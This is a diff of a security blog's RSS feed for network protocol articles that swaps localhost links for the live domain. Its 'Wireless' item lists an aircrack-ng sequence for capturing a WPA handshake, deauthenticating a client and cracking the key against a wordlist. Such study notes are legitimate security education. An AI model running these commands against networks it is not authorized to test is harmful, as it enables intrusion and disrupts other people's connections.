@@ -2,31 +2,31 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>📚 Network Protocols on Analyst</title>
-    <link>http://localhost:1313/docs/attacks/protocols/</link>
+    <link>https://bakerst221b.com/docs/attacks/protocols/</link>
     <description>Recent content in 📚 Network Protocols on Analyst</description>
     <generator>Hugo</generator>
     <language>en-us</language>
     <lastBuildDate>Thu, 28 Jul 2022 15:14:39 +1000</lastBuildDate>
-    <atom:link href="http://localhost:1313/docs/attacks/protocols/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="https://bakerst221b.com/docs/attacks/protocols/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>📚 TCP/IP Stack Overview</title>
-      <link>http://localhost:1313/docs/attacks/protocols/tcp-ip/</link>
+      <link>https://bakerst221b.com/docs/attacks/protocols/tcp-ip/</link>
       <pubDate>Sun, 29 Nov 2020 15:20:08 +0300</pubDate>
-      <guid>http://localhost:1313/docs/attacks/protocols/tcp-ip/</guid>
+      <guid>https://bakerst221b.com/docs/attacks/protocols/tcp-ip/</guid>
       <description>&lt;p&gt;&lt;em&gt;This article is an overview of TCP/IP protocol stack. I will cover in detail what happens when a request to, say, &lt;code&gt;bakerst221b.com&lt;/code&gt; is sent in the browser.&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;There is this famous OSI model&amp;hellip; If you have ever scratched the surface of network security, you must have heard of it. It&amp;rsquo;s an empermal model (like spherical eggs &amp;#x1f95a; in the vacuum - a joke from Big Bang Theory). It&amp;rsquo;s not a real thing, it&amp;rsquo;s more like a blueprint &amp;#x1f5fa;&amp;#xfe0f; for making real things. This model basically describes, what an empermal packet sent over network should approximately look like. It&amp;rsquo;s called a packet &amp;#x1f4e6; because it looks very much like one: your message wrapped in an envelope, wrapped in some paper, put into a box and sent via post office and finally delivered to the door. Comparing this process with mail services is not uncommon, but I will use it in my example. However, to make the process clearer, I&amp;rsquo;ve sacrificied some realism. Though it&amp;rsquo;s unreal, in my humble opinion it better describes the process.&lt;/p&gt;</description>
     </item>
     <item>
       <title>📚 Wireless</title>
-      <link>http://localhost:1313/docs/attacks/protocols/wireless/</link>
+      <link>https://bakerst221b.com/docs/attacks/protocols/wireless/</link>
       <pubDate>Mon, 12 Oct 2020 17:50:01 +0300</pubDate>
-      <guid>http://localhost:1313/docs/attacks/protocols/wireless/</guid>
+      <guid>https://bakerst221b.com/docs/attacks/protocols/wireless/</guid>
       <description>&lt;h2 id=&#34;attacks&#34;&gt;Attacks&lt;/h2&gt;&#xA;&lt;p&gt;&lt;code&gt;iwconfig&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;airmon-ng check kill&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;airmon-ng start wlan0&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;iwconfig&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;airodump-ng wlan0mon&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;airdump-ng -c &amp;lt;channel number&amp;gt; --bssid &amp;lt;access point MAC&amp;gt; -w capture wlan0mon&lt;/code&gt; to capture the handshake or enough data to deduce the key. To speed up - deauth attack (temp disassociate the client).&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;aireplay-ng -0 1 -a &amp;lt;MAC of AP&amp;gt; -c &amp;lt;client MAC&amp;gt; &amp;lt;interface&amp;gt;&lt;/code&gt; along with the above command still running. Look at &lt;code&gt;capure&lt;/code&gt; file. Get a dictionary of weak passwords or some probable options, crack with &lt;code&gt;hashcat&lt;/code&gt; or &lt;code&gt;aircrack-ng -w &amp;lt;wordlist&amp;gt; -b &amp;lt;MAC&amp;gt; &amp;lt;capturefile&amp;gt;&lt;/code&gt;.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Routing Protocols</title>
-      <link>http://localhost:1313/docs/attacks/protocols/routing/</link>
+      <link>https://bakerst221b.com/docs/attacks/protocols/routing/</link>
       <pubDate>Thu, 28 Jul 2022 15:14:39 +1000</pubDate>
-      <guid>http://localhost:1313/docs/attacks/protocols/routing/</guid>
+      <guid>https://bakerst221b.com/docs/attacks/protocols/routing/</guid>
       <description>&lt;p&gt;[&lt;a href=&#34;https://www.firewall.cx/networking-topics/routing.html&#34;&gt;1&lt;/a&gt;]&lt;/p&gt;</description>
     </item>
   </channel>
